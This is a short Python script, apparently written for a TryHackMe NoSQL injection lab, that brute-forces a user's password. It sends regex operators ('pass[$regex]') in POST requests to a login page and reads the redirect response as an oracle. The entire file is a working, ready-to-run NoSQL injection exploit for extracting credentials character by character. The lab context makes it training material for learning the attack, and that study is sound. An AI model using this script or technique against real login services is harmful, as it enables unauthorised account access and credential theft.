"""This script is meant for TryHackMe's 'NoSQL Injection' room"""

import requests
import sys

target_ip = f"{sys.argv[1]}"

url = f"http://{target_ip}/login.php"

def GuessPass():
    guessed_password_chars = ""
    all_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-=!@#$%^&*()_+"
    dots = ".........."

    while len(guessed_password_chars) < (len(dots) + 1):
        for char in all_chars:
            data = {
                "user": "pedro",
                "pass[$regex]": f"^{guessed_password_chars}{char}{dots}$",
                "remember": "on"
            }


            try:
                response = requests.post(url, data=data, allow_redirects=False)

                if response.headers.get('Location') == '/sekr3tPl4ce.php':
                    guessed_password_chars += f"{char}"
                    dots = dots.replace(".", "", 1)
                    print(guessed_password_chars)
                
                elif response.headers.get('Location') == '/?err=1':
                    continue

                else:
                    print(response.headers)

            except requests.exceptions.RequestException as e:
                pass

if __name__ == "__main__":
    GuessPass()